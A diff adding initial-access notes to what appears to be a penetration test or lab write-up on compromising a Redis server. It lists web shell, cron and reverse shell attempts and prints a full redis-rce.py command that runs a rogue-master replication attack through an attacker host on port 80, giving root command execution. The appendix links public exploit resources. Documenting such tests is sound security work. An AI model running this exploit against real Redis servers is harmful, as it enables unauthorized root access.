@@ -85,6 +85,28 @@ This represented a critical misconfiguration and became the primary attack vecto
 
 ## 6. Initial Access
 
+### Redis Exploitation Attempts
+
+Several Redis abuse techniques were tested, including:
+
+- Writing PHP/JSP shells to web directories
+- Cron job persistence
+- Reverse shell payloads
+
+While file writes succeeded, execution was not possible via the web server.
+
+### Redis Replication Abuse
+
+The final successful attack used a Redis rogue master replication attack, which forces Redis to load a malicious shared object file and execute commands as root.
+
+Initial attempts using default, high, or common ports failed due to outbound filtering. The exploit succeeded when the rogue server was hosted on port 80, a commonly allowed outbound port:
+
+```
+python redis-rce.py -r 192.168.169.69 -p 6379 -L <attacker-ip> -P 80 -f exp_lin.so
+```
+
+This resulted in immediate command execution as the root user.
+
 ---
 
 ## 7. Post-Exploitation
@@ -104,3 +126,9 @@ This represented a critical misconfiguration and became the primary attack vecto
 ---
 
 ## 11. Appendix
+
+Redis Pentesting Cheatsheet -
+[https://hackviser.com/tactics/pentesting/services/redis](https://hackviser.com/tactics/pentesting/services/redis)
+
+Redis Rogue Server RCE -
+[https://github.com/jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)
